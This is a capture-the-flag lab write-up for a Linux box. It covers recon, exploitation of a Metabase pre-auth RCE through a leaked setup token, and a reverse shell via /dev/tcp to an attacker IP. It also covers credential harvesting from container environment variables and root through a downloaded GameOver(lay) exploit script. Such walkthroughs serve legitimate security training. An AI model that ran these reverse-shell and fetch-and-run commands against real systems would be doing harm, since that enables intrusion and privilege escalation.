## Intro

Tags: #linux #OSCPpath #WebApp #docker #VulnOS #easy

---
# Reconnaissance

## Port Scanning

### TCP

A full TCP port scan reveals two open services: SSH on port 22 and HTTP on port 80.

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.11.233 -oG allPorts
```

```shell
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### TCP targeted scan on open ports

A targeted version scan identifies the web server redirects to `analytical.htb`, and the system is running Ubuntu.

```bash
nmap -sCV -p22,80 10.10.11.233 -oN targeted
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web App

The web server redirects to `http://analytical.htb/`, so add the domain to `/etc/hosts`.
```bash
echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts
```

### Directories

Directory brute-forcing on port 80 reveals only static asset directories.
```bash
feroxbuster -u http://analytical.htb/ -d 2 -C 400,403,404,405,500
```

```shell
301      GET        7l       12w      178c http://analytical.htb/images => http://analytical.htb/images/
301      GET        7l       12w      178c http://analytical.htb/js => http://analytical.htb/js/
301      GET        7l       12w      178c http://analytical.htb/css => http://analytical.htb/css/
```

### Subdomains

Fuzzing the Host header reveals a subdomain `data.analytical.htb`.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.233 -H "Host: FUZZ.analytical.htb" -mc all -ac
```

```text
data                    [Status: 200, Size: 77883, Words: 3574, Lines: 28]
```

Add the subdomain to `/etc/hosts`.
```bash
echo "10.10.11.233 data.analytical.htb" | sudo tee -a /etc/hosts
```

#### Version Identification

Visiting `data.analytical.htb` reveals a `Metabase` login page. Inspecting the page source exposes the version.

```bash
curl -s http://data.analytical.htb/ | grep -i version
```
`Metabase` version: `v0.46.6`

---

# Foothold

## Vulnerable webapp version

### Exploiting CVE-2023-38646

By reviewing the poc, Metabase versions < 0.46.6.1 are vulnerable to a pre-authentication RCE via the `setup-token` and `/api/setup/validate` endpoint.

### Leak Setup Token via api

The setup token is leaked via the `/api/session/properties` API endpoint.

```bash
curl -s http://data.analytical.htb/api/session/properties | jq '. | to_entries[] | select(.key=="setup-token") | .value'
```

```text
249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

### Trigger Reverse Shell

Used a public exploit script to send a crafted payload and receive a shell inside a Docker container.
https://github.com/Kushiro45/metabase-cve-2023-38646
```bash
python3 metabase_0.46.6_exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.33/4444 0>&1"
```
Start listener
```bash
nc -lvnp 4444
```

## Shell on container
```shell
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.233] 54321
bash: no job control in this shell
b7ed0bb2dd1e:/$
```

### Container Enumeration

### Confirming Docker Environment

The hostname is random and a `.dockerenv` file exists in root.
```bash
ls -la /
```

```shell
.dockerenv
app
bin
...
```

### Checking Environment Variables

The `env` command reveals credentials embedded in environment variables.
```bash
env
```
#### creds obtained
```shell
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

## Shell as metalytics

Use the discovered credentials to SSH into the target host.
```bash
ssh metalytics@10.10.11.233
```

```shell
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```
grabbed user flag

---
# Privilege Escalation

## Check kernel version

Enumerate the kernel and OS version to identify potential exploits.
```bash
uname -r
cat /etc/lsb-release
```

```shell
6.2.0-25-generic
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
```

## Exploiting CVE-2023-2640 / CVE-2023-32629 (GameOver(lay))

`Ubuntu 22.04 with kernel 6.2.0-25-generic` is vulnerable to the GameOver(lay) OverlayFS privilege escalation.

### Download and Run the Exploit

Use this public exploit to escalate
```bash
curl -o exploit.sh https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

## Shell as root

```shell
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/home/metalytics# id
uid=0(root) gid=0(root) groups=0(root)
```

---
